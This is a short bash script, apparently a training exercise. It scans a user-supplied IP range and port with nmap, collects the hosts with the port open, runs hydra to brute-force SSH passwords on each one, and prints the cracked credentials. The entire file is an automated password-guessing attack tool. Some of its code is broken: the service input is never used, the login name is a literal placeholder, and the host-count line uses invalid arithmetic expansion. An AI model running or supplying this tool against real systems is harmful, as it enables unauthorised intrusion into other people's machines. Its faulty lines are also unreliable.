#!/bin/bash


# Get from the user an IP range to scan(read)
read -p "Entter IP to scan: " IP
# Get from the user the service and port to attack(read + nmap)
read -p "Enter the service to scan: " SERVICE
read -p "Enter the port to scan: " PORT
nmap $IP -p $PORT -oG result1.lst
cat result1.lst | grep open | awk '{print $2}' > result2.lst
echo "[*] Found $((cat result2.lst) | wc -l) Devices running $SERVICE service."
# Run brute force on the found devices(hydra)
echo "[*] Running Brute Force."
hydra -l users -P password -M result2.lst ssh -t 4 > result3.lst
# users is provided or assumed such as admin, password is provided alongside
# the IP address or assumed 
# Display to the user all the cracked passwords.
cat result3.lst

